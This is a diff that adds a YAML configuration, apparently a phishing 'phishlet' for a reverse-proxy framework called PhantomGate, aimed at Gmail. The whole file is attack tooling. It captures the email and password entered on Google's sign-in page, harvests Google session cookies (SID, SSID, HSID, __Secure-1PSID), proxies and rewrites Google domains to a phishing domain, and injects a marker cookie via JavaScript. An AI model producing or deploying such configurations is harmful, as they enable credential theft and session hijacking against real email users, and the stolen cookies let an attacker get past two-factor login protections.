@@ -1,0 +1,47 @@
+name: Gmail
+author: PhantomGate
+version: 1.0.0
+description: Gmail authentication
+
+auth:
+  domains:
+    - accounts.google.com
+    - mail.google.com
+  
+  login:
+    domain: accounts.google.com
+    path: /signin/v2/identifier
+    username:
+      selector: "input[type='email']"
+      capture: true
+    password:
+      selector: "input[type='password']"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: SID
+        regex: ".*"
+      - name: SSID
+        regex: ".*"
+      - name: HSID
+        regex: ".*"
+      - name: __Secure-1PSID
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: accounts.google.com
+      inject: true
+    - domain: mail.google.com
+      inject: true
+
+filters:
+  sub_filters:
+    - domain: accounts.google.com
+      search: "https://accounts.google.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    document.cookie = "PhantomGate=1; path=/";
